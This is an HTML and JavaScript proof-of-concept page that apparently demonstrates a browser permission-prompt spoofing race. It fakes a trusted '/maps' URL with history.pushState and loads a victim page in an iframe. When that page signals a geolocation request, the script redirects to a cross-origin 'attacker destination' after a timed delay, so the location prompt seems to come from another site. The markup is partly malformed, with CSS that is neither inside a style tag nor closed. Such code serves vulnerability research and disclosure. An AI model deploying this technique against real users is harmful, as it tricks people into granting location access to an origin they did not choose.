<!doctype html>
<html>
<head>

button {
  font-size: 15px;
  padding: 10px 14px;
  border-radius: 10px;
  border: none;
  background: #007aff;
  color: #fff;

  width: 100%;
  height: 100vh;

<div id="ui" style="text-align:center; margin-top:60px;">
  <button id="start">Open Maps</button>
</div>

<iframe id="victimFrame"></iframe>

<script>
const start = document.getElementById('start');
const frame = document.getElementById('victimFrame');

start.onclick = () => {
  // Step 1: Make URL look trusted
  history.pushState({}, '', '/maps');

  // Step 2: Load victim inside iframe (attacker stays alive)
  frame.src = 'https://ecdnts-del.github.io/spoof/victim.html';
  frame.style.display = 'block';
  document.getElementById('ui').style.display = 'none';
};

/*
 * Step 3:
 * Victim signals geolocation start → attacker triggers race
 */
window.addEventListener('message', (e) => {
  if (e.data !== 'geo-request-started') return;

  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        // Cross-origin attacker destination
        location.href = 'https://google.com:9090/';
      }, 80);
    });
  });
});
</script>
